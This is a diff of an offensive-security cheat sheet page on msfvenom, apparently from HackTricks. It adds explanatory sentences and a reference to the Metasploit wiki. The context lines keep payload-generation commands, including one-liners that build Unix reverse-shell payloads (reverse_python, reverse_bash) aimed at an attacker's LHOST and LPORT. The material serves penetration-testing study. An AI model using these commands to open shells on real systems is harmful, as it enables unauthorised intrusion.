@@ -8,7 +8,7 @@
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-One can also use the `-a` to specify the architecture or the `--platform`
+Use `-a` to select the payload architecture and `--platform` to select its target platform.<sup>[[1]](#references)</sup>
 
 ## Listing
 
@@ -16,6 +16,8 @@ One can also use the `-a` to specify the architecture or the `--platform`
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
+
+These commands list the payload and encoder modules available in the installed framework.<sup>[[1]](#references)</sup>
 
 ## Common params when creating a shellcode
 
@@ -26,6 +28,8 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
+
+The flags shown here select bad characters, output format, encoder, and encoding iterations.<sup>[[1]](#references)</sup>
 
 ## **Windows**
 
@@ -169,5 +173,8 @@ msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw 
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
 
-{{#include ../../banners/hacktricks-training.md}}
+## References
 
+- [1] [How to use msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
+
+{{#include ../../banners/hacktricks-training.md}}
